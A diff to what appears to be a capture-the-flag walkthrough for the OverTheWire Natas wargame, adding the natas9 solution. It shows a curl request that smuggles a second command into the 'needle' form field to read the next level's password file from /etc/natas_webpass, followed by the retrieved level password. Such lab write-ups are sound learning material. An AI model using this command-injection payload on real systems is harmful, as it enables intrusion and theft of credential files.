@@ -47,4 +47,10 @@ curl --silent --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe --request POST --fo
 ```
 
 natas9
-`natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
+```
+curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --request POST --form 'submit=1' --form 'needle=wwwwww dictionary.txt; cat /etc/natas_webpass/natas10; touch' http://natas9.natas.labs.overthewire.org
+```
+
+`
+natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+`
